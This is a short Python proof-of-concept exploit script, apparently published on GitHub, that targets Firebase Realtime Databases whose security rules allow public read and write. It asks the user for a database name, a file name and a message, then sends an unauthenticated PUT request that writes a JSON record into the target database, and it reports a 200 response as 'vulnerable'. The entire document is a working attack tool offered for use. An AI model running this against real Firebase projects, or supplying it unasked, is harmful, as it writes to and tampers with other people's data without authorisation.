import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC BY: http://github.com/MazX0p \\ Mohamed Alzhrani                                    \033[0m')
    print('+  \033[34mTARGET:  FireBase with security rules as true for both "read" & "write"                 \033[0m')
    print('+  \033[36mUSAGE:  python3 FireBaseExploit.py                                                      \033[0m')
    print('+  \033[36mFireBase name       >>> 0xLinux.firebaseio.com name is : 0xLinux                        \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, file, message, name):
    vuln_url = "https://"+target_url+".firebaseio.com/"+file+".json"
    data = {"Exploit": "Successfull", "Name": name, "message": message}

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.put(vuln_url,json=data)
        if response.status_code == 200 :
            print("\033[32m[+] Oha it's vulnerable ! \033[0m")
        elif response.status_code == 401:
            print("\033[31m[x] Target is not vulnerable \033[0m")
    except Exception as e:
        print("\033[31m[x] OH NO! Target request failed  \033[0m")

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35minput target  FireBase name\nFireBase Name    >>> \033[0m"))
    file = str(input("\033[35minput file name u want to make\nFile Name    >>> \033[0m"))
    message = str(input("\033[35minput Your message u want inside the json file\nMessage    >>> \033[0m"))
    name = str(input("\033[35minput name you want inside the json file\nName    >>> \033[0m"))
    POC_1(target_url, file, message, name)
